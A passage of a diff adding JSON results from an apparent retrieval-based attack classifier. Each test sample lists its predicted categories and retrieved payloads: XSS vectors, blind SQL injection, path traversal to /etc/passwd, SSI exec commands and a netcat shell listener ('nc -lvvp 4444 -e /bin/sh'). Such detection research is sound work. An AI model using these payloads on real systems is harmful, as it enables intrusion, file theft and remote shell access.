repeat-start=\"999999\">1</y></x>//[\"'`-->]]>]</div><div id=\"14\"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//[\"'`-->]]>]</div><div id=\"15\"><script>({0:#0=alert/#0#/#0#(0)})</script>//[\"'`-->]]>]</div><div id=\"16\">X<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//[\"'`-->]]>]</div><div id=\"17\"><?xml-stylesheet href=\"javascript:alert(17)\"?><root/>//[\"'`-->]]>]</div><div id=\"18\"><script xmlns=\"http://www.w3.org/1999/xhtml\">&#x61;l&#x65;rt&#40;1)</script>//[\"'`-->]]>]</div><div id=\"19\"><meta charset=\"x-mac-farsi\">\u00bcscript \u00bealert(19)//\u00bc/script \u00be//[\"'`-->]]>]</div><div id=\"20\"><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(20)}),x</script>//[\"'`-->]]>]</div><div id=\"21\"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(21)')()</script>//[\"'`-->]]>]</div><div id=\"22\"><input onblur=focus() autofocus><input>//[\"'`-->]]>]</div><div id=\"23\"><form id=test onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>X</button>//[\"'`-->]]>]</div><div id=\"24\">1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(24)&gt;`>//[\"'`-->]]>]</div><div id=\"25\"><script src=\"#\">{alert(25)}</script>;1//[\"'`-->]]>]</div><div id=\"26\">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//[\"'`-->]]>]</div><div id=\"27\"><style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//[\"'`-->]]>]</div>",
+        "Attack Type: XSS | Payload: <div id=\"69\"><card xmlns=\"http://www.wapforum.org/2001/wml\"><onevent type=\"ontimer\"><go href=\"javascript:alert(69)\"/></onevent><timer value=\"1\"/></card>//[\"'`-->]]>]</div><div id=\"70\"><div style=width:1px;filter:glow onfilterchange=alert(70)>x</div>//[\"'`-->]]>]</div><div id=\"71\"><// style=x:expression\\28alert(71)\\29>//[\"'`-->]]>]</div><div id=\"72\"><form><button formaction=\"javascript:alert(72)\">X</button>//[\"'`-->]]>]</div><div id=\"73\"><event-source src=\"event.php\" onload=\"alert(73)\">//[\"'`-->]]>]</div><div id=\"74\"><a href=\"javascript:alert(74)\"><event-source src=\"data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A\" /></a>//[\"'`-->]]>]</div><div id=\"75\"><script<{alert(75)}/></script </>//[\"'`-->]]>]</div><div id=\"76\"><?xml-stylesheet type=\"text/css\"?><!DOCTYPE x SYSTEM \"test.dtd\"><x>&x;</x>//[\"'`-->]]>]</div><div id=\"77\"><?xml-stylesheet type=\"text/css\"?><root style=\"x:expression(alert(77))\"/>//[\"'`-->]]>]</div><div id=\"78\"><?xml-stylesheet type=\"text/xsl\" href=\"#\"?><img xmlns=\"x-schema:test.xdr\"/>//[\"'`-->]]>]</div><div id=\"79\"><object allowscriptaccess=\"always\" data=\"test.swf\"></object>//[\"'`-->]]>]</div><div id=\"80\"><style>*{x:\uff45\uff58\uff50\uff52\uff45\uff53\uff53\uff49\uff4f\uff4e(alert(80))}</style>//[\"'`-->]]>]</div><div id=\"81\"><x xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:actuate=\"onLoad\" xlink:href=\"javascript:alert(81)\" xlink:type=\"simple\"/>//[\"'`-->]]>]</div><div id=\"82\"><?xml-stylesheet type=\"text/css\" href=\"data:,*%7bx:expression(write(2));%7d\"?>//[\"'`-->]]>]</div>"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "xml_test-5982",
+      "top_categories": "Path Traversal,Command Injection,SQLi",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: Path Traversal | Payload: /..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd",
+        "Attack Type: Command Injection | Payload: nc -lvvp 4444 -e /bin/sh",
+        "Attack Type: SQLi | Payload: '+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "xml_test-4965",
+      "top_categories": "SQLi,Path Traversal,Path Traversal",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: SQLi | Payload: UNION ALL SELECT 1,2,3,4,5,6,7,8--",
+        "Attack Type: Path Traversal | Payload: /../../../../../../../../../../../etc/passwd%00.jpg",
+        "Attack Type: Path Traversal | Payload: ..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215{FILE}"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "xml_test-5293",
+      "top_categories": "Command Injection,SQLi,SQLi",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: Command Injection | Payload: nc -lvvp 4444 -e /bin/sh",
+        "Attack Type: SQLi | Payload: '+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--",
+        "Attack Type: SQLi | Payload: HAVING 1=1--"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "xml_test-5330",
+      "top_categories": "SQLi,SSI,SQLi",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: SQLi | Payload: RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
+        "Attack Type: SSI | Payload: <pre><!--#exec cmd=\"whoami\"--></pre>",
+        "Attack Type: SQLi | Payload: RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "xml_test-34319",
+      "top_categories": "Path Traversal,SQLi,Command Injection",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: Path Traversal | Payload: ..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini",
+        "Attack Type: SQLi | Payload: )) and 0=benchmark(3000000,MD5(1))%20--",
+        "Attack Type: Command Injection | Payload: \";echo$IFSLFGEOY$((22%2B44))$(echo$IFSLFGEOY)LFGEOY//"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "xml_test-5443",
+      "top_categories": "SQLi,XSS,XSS",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: SQLi | Payload: RANDOMBLOB(500000000/2)",
+        "Attack Type: XSS | Payload: <iframe src=%22404%22 onload=%22frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\/script>%26quot;)%22></iframe>",
+        "Attack Type: XSS | Payload: <iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\/script>%26quot;)%22></iframe>"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "xml_test-4873",
+      "top_categories": "Command Injection,SQLi,SQLi",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: Command Injection | Payload: nc -lvvp 4444 -e /bin/sh",
+        "Attack Type: SQLi | Payload: '+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--",
+        "Attack Type: SQLi | Payload: uni/**/on sel/**/ect"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "xml_test-33363",
+      "top_categories": "Command Injection,Command Injection,SQLi",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: Command Injection | Payload: %26%26echo%20CJDFNU$((77%2B46))$(echo%20CJDFNU)CJDFNU%2F%2F",
+        "Attack Type: Command Injection | Payload: %26echo%20PSQPBU$((10%2B52))$(echo%20PSQPBU)PSQPBU",
+        "Attack Type: SQLi | Payload: ' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "xml_test-6058",
+      "top_categories": "XSS,Command Injection,XSS",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: XSS | Payload: <div id=\"122\"><iframe sandbox=\"allow-same-origin allow-forms allow-scripts\" src=\"http://example.org/\"></iframe>//[\"'`-->]]>]</div>",
+        "Attack Type: Command Injection | Payload: \";echo$IFSLFGEOY$((22%2B44))$(echo$IFSLFGEOY)LFGEOY//",
+        "Attack Type: XSS | Payload: <tt onmousedown=\"alert(1)\">test</tt>"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "xml_test-5025",
+      "top_categories": "XSS,XSS,SQLi",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: XSS | Payload: <div id=\"1\"><form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>//[\"'`-->]]>]</div><div id=\"2\"><meta charset=\"x-imap4-modified-utf7\">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//[\"'`-->]]>]</div><div id=\"3\"><meta charset=\"x-imap4-modified-utf7\">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//[\"'`-->]]>]</div><div id=\"4\">0?<script>Worker(\"#\").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//[\"'`-->]]>]</div><div id=\"5\"><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//[\"'`-->]]>]</div><div id=\"6\"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//[\"'`-->]]>]</div><div id=\"7\"><input onfocus=alert(7) autofocus>//[\"'`-->]]>]</div><div id=\"8\"><input onblur=alert(8) autofocus><input autofocus>//[\"'`-->]]>]</div><div id=\"9\"><a style=\"-o-link:'javascript:alert(9)';-o-link-source:current\">X</a>//[\"'`-->]]>]</div><div id=\"10\"><video poster=javascript:alert(10)//></video>//[\"'`-->]]>]</div><div id=\"11\"><svg xmlns=\"http://www.w3.org/2000/svg\"><g onload=\"javascript:alert(11)\"></g></svg>//[\"'`-->]]>]</div><div id=\"12\"><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//[\"'`-->]]>]</div><div id=\"13\"><x repeat=\"template\" repeat-start=\"999999\">0<y repeat=\"template\" repeat-start=\"999999\">1</y></x>//[\"'`-->]]>]</div><div id=\"14\"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//[\"'`-->]]>]</div><div id=\"15\"><script>({0:#0=alert/#0#/#0#(0)})</script>//[\"'`-->]]>]</div><div id=\"16\">X<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//[\"'`-->]]>]</div><div id=\"17\"><?xml-stylesheet href=\"javascript:alert(17)\"?><root/>//[\"'`-->]]>]</div><div id=\"18\"><script xmlns=\"http://www.w3.org/1999/xhtml\">&#x61;l&#x65;rt&#40;1)</script>//[\"'`-->]]>]</div><div id=\"19\"><meta charset=\"x-mac-farsi\">\u00bcscript \u00bealert(19)//\u00bc/script \u00be//[\"'`-->]]>]</div><div id=\"20\"><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(20)}),x</script>//[\"'`-->]]>]</div><div id=\"21\"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(21)')()</script>//[\"'`-->]]>]</div><div id=\"22\"><input onblur=focus() autofocus><input>//[\"'`-->]]>]</div><div id=\"23\"><form id=test onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>X</button>//[\"'`-->]]>]</div><div id=\"24\">1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(24)&gt;`>//[\"'`-->]]>]</div><div id=\"25\"><script src=\"#\">{alert(25)}</script>;1//[\"'`-->]]>]</div><div id=\"26\">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//[\"'`-->]]>]</div><div id=\"27\"><style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//[\"'`-->]]>]</div>",
+        "Attack Type: XSS | Payload: <link href=validstyles.css rel=stylesheet onload=alert(1)>",
+        "Attack Type: SQLi | Payload: AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "xml_test-34165",
+      "top_categories": "SQLi,SSI,SQLi",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: SQLi | Payload: ' and 'one'='one\u2013",
+        "Attack Type: SSI | Payload: <!--#exec cmd=\"cd C:\\WINDOWS\\System32\">",
+        "Attack Type: SQLi | Payload: )) or benchmark(10000000,MD5(1))#"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "xml_test-5305",
+      "top_categories": "Command Injection,XSS,SQLi",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: Command Injection | Payload: \";echo$IFSLFGEOY$((22%2B44))$(echo$IFSLFGEOY)LFGEOY//",
+        "Attack Type: XSS | Payload: <script> (function (o) { function exploit(x) { if (x !== null) alert('User cookie is ' %2B x); else console.log('fail'); } o.onclick = function (e) { e.__defineGetter__('isTrusted', function () { return true; }); exploit(Safe.get()); }; var e = document.createEvent('MouseEvent'); e.initEvent('click', true, true); o.dispatchEvent(e); })(document.getElementById('safe123')); </script>",
+        "Attack Type: SQLi | Payload: ')) and 0=benchmark(3000000,MD5(1))%20%23"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    }
+  ]
+}
